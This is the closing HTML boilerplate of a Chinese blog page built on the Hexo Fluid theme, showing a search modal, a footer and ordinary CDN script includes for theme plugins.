        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href=""><span>fffer</span></a> <i class="iconfont icon-bug"></i> <a href="" target="_blank" rel="nofollow noopener"><span>0p1n</span></a> <br /> <a href=""><span>富强 民主 文明 和谐 自由 平等 公正 法治 爱国 敬业 诚信 友善</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="../../../../js/events.js" ></script>
<script  src="../../../../js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="../../../../js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="../../../../js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="../../../../js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
